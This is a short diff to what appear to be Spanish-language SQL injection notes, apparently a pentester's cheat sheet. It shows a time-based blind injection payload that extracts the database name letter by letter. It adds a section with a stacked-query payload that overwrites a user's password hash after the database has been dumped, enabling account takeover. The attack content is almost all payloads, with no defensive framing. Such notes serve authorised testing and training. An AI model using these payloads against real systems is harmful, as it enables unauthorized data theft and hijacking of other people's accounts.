@@ -22,7 +22,13 @@ Si es en cookie, quitar el ";"
     <dato>'; IF (select substring(db_name(),<index>,1))='<letra>' WAITFOR DELAY '0:0:10'-- 
 
 
+### Cambiar datos de un user
 
+Si tenemos ya exfiltrada la base de datos y algun usuario, para no exfiltrar el password podemos intentar sobreescribirlo.
+
+Para esto deberemos buscar una password y hashearla con el mismo algoritmo en uso (esto lo sacamos por fuerza bruta) 
+
+    '; update <tabla> set password_hash = '<hash>' where username = '<user>';--
 
 ## Apéndice:
 SQLMAP tiene todas las respuestas xD
